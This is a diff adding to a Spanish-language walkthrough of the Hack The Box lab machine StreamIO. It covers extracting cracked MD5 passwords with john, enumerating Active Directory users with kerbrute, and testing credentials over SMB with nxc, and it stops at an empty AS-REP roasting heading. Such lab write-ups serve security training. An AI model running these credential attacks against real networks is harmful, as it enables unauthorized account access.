@@ -174,5 +174,40 @@ Obteniendo así las contraseñas de los usuarios
 john --show hashes --format=Raw-MD5 | grep -v cracked | sed '/^\s*$/d'
 ```
 
-L
+Los usuarios los añadiremos al los que ya habíamos enumerado anteriormente
+```shell
+john --show hashes --format=Raw-MD5 | grep -v cracked | sed '/^\s*$/d' | awk '{print $1}' FS=":" >> users.txt 
+```
+
+Y las contraseñas las guardamos en otro archivo 
+```shell
+john --show hashes --format=Raw-MD5 | grep -v cracked | sed '/^\s*$/d' | awk '{print $2}' FS=":" > passwords.txt
+```
+
+Validaremos cual de los usuarios es valido en el servidor usando Kerberos
+
+## Kerberos
+```shell
+kerbrute userenum --dc 10.129.13.11 -d streamIO.htb users.txt
+```
+
+Viendo como usuarios validos
+```ad-info
+martin@streamIO.htb
+administrator@streamIO.htb
+yoshihide@streamIO.htb
+```
+
+También vamos a validar si las contraseñas de todos los usuarios son validas o corresponden a las extraídas
+```shell
+nxc smb 10.129.13.11 -u users.txt -p passwords.txt --no-bruteforce
+```
+
+Ninguna es valida
+
+Ya que tenemos de nuevo una lista de usuarios validos vamos a voklver a verifiacar si alguno es vulnerable a AS-REP Roast attack
+
+### AS-REP Roast
+
+
 
